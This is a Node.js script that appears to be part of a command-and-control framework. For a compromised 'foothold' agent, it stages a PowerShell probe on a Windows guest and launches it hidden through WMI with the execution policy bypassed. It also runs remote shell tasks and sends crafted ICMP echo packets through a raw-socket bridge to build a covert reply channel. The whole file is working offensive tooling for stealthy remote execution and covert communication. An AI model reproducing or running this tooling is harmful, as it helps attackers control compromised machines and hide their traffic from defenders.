// probe-matrix.mjs <footholdId> — the decisive wire-shape matrix for the ICMP reply path.
// Guest side: stages + WMI-launches guest-icmp-matrix.ps1 (self-logging, detached).
// Host side: a scratch python bridge sends three probe shapes at the guest:
//   P1 type 8 kind pull   seq 5001  (echo request, unsolicited)
//   P2 type 0 kind reply  seq 5002  (echo reply, UNSOLICITED)
//   P3 type 0 kind reply  seq 4242  (echo reply answering the guest's own probe = SOLICITED)
// Then reads the guest log. Which seqs appear = which shapes Windows delivers to a raw socket.
import { spawn } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { icmpPacket, parseIcmpPacket } from '../varvel/engine/icmpcodec.mjs';

const API = 'http://127.0.0.1:8971';
const GUEST = '192.168.50.130';
const BRIDGE = fileURLToPath(new URL('../varvel/agents/icmp-bridge.py', import.meta.url));
const FOOTHOLD = process.argv[2];
if (!FOOTHOLD) { console.error('usage: node probe-matrix.mjs <footholdId>'); process.exit(2); }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function j(path, body) {
  const r = await fetch(API + path, body ? { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) } : undefined);
  return r.json();
}
async function waitTask(agentId, taskId, s = 60) {
  for (let i = 0; i < s / 2; i++) {
    await sleep(2000);
    const { tasks } = await j('/api/channel/tasks?agent=' + agentId);
    const x = (tasks || []).find((y) => y.taskId === taskId);
    if (x && x.status === 'resulted') return x.resultPreview;
  }
  return null;
}

// 1) stage the guest probe
const b64 = readFileSync(new URL('./guest-icmp-matrix.ps1', import.meta.url)).toString('base64');
const st = await j('/api/channel/stage', { agentId: FOOTHOLD, name: 'guest-icmp-matrix.ps1', b64 });
console.log('staged:', await waitTask(FOOTHOLD, st.taskId, 30));

// 2) clear any old log, then WMI-launch the probe DETACHED (zero shared handles)
await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'del C:\\Windows\\Temp\\icmp-matrix.log' });
await sleep(3000);
const wmi = "powershell -NoProfile -Command $r=Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Windows\\System32\\agentbox\\guest-icmp-matrix.ps1'}; $r.ReturnValue";
const lt = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: wmi });
console.log('launch:', await waitTask(FOOTHOLD, lt.taskId, 30));

// 3) host-side scratch bridge, then the three probe shapes on a schedule
const child = spawn('python', ['-u', BRIDGE], { windowsHide: true, stdio: ['pipe', 'pipe', 'pipe'] });
let buf = ''; const lines = [];
child.stdout.on('data', (d) => {
  buf += d.toString('utf8');
  let nl;
  while ((nl = buf.indexOf('\n')) >= 0) { const line = buf.slice(0, nl).trim(); buf = buf.slice(nl + 1); if (!line) continue; try { lines.push(JSON.parse(line)); } catch {} }
});
let cap = null;
for (let i = 0; i < 100 && !cap; i++) { cap = lines.find((m) => m.op === 'capability'); if (!cap) await sleep(100); }
if (!cap || !cap.supported) { console.log('BRIDGE-UNSUPPORTED:', JSON.stringify(cap)); child.kill(); process.exit(1); }
console.log('bridge:', cap.reason);
const send = (pkt) => child.stdin.write(JSON.stringify({ id: 1, op: 'send', dst: GUEST, packetB64: pkt.toString('base64') }) + '\n');

await sleep(4000); // let the guest probe start listening
send(icmpPacket({ type: 8, seq: 5001, kind: 'pull', idx: 0, cnt: 1, data: Buffer.from('matrix-p1') }));
await sleep(800);
send(icmpPacket({ type: 0, seq: 5002, kind: 'reply', idx: 0, cnt: 1, data: Buffer.from('matrix-p2') }));
await sleep(800);
send(icmpPacket({ type: 0, seq: 4242, kind: 'reply', idx: 0, cnt: 1, data: Buffer.from('matrix-p3') }));
console.log('probes sent: P1 type8/seq5001  P2 type0/seq5002 (unsolicited)  P3 type0/seq4242 (solicited)');

await sleep(24000); // guest listens 20s
child.kill();
const t2 = await j('/api/channel/task', { agentId: FOOTHOLD, kind: 'shell', data: 'type C:\\Windows\\Temp\\icmp-matrix.log' });
console.log('MATRIX LOG:', JSON.stringify(await waitTask(FOOTHOLD, t2.taskId, 40)));
